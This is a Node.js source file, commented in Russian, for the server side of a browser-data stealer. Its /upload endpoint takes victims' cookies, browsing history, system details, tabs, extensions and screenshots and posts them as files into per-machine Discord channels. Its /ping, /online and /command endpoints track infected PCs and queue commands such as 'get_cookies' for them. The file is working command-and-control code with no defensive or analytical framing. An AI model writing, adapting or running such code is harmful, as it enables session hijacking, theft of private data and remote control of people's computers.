import express from "express";
import { Client, GatewayIntentBits } from "discord.js";

const app = express();
app.use(express.json({ limit: "50mb" }));

// Переменные окружения
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

// Онлайн ПК
const onlinePCs = {}; // { pcId: lastPingTime }
const pendingCommands = {}; // { pcId: ['get_cookies', ...] }

// Запускаем Discord бота
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });

bot.once("ready", () => {
  console.log(`✅ Бот вошёл как ${bot.user.tag}`);
});

// Получить или создать категорию
async function getOrCreateCategory(guild, name) {
  let category = guild.channels.cache.find(
    (c) => c.type === 4 && c.name === name
  );
  if (!category) {
    category = await guild.channels.create({
      name,
      type: 4,
    });
  }
  return category;
}

// Получить или создать текстовый канал
async function getOrCreateTextChannel(guild, name, parentId) {
  if (!name) throw new Error("Channel name is required!");
  let channel = guild.channels.cache.find(
    (c) => c.type === 0 && c.name === name && c.parentId === parentId
  );
  if (!channel) {
    channel = await guild.channels.create({
      name: name,
      type: 0,
      parent: parentId,
    });
  }
  return channel;
}

// Приём данных от ПК
app.post("/upload", async (req, res) => {
  try {
    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } =
      req.body;

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_NAME);
    const channel = await getOrCreateTextChannel(guild, pcId, category.id);

    const files = [];

    if (cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
    if (history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
    if (systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
    if (tabs) files.push({ attachment: Buffer.from(JSON.stringify(tabs, null, 2)), name: `${pcId}-tabs.json` });
    if (extensions) files.push({ attachment: Buffer.from(JSON.stringify(extensions, null, 2)), name: `${pcId}-extensions.json` });
    if (screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });

    if (files.length) await channel.send({ files });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// Ping ПК → отдаём команды
app.post("/ping", (req, res) => {
  const { pcId } = req.body;
  if (!pcId) return res.status(400).json({ error: "pcId required" });

  onlinePCs[pcId] = Date.now();

  const commands = pendingCommands[pcId] || [];
  pendingCommands[pcId] = []; // после отдачи очищаем

  res.json({ commands });
});

// Проверка онлайн ПК
app.get("/online", (req, res) => {
  const now = Date.now();
  const online = Object.entries(onlinePCs)
    .filter(([_, ts]) => now - ts < 20000)
    .map(([id]) => id);
  res.json({ online });
});

// Отправить команду ПК
app.post("/command", (req, res) => {
  const { pcId, command } = req.body;
  if (!pcId || !command) return res.status(400).json({ error: "pcId and command required" });
  if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
  pendingCommands[pcId].push(command);
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));

bot.login(DISCORD_BOT_TOKEN);
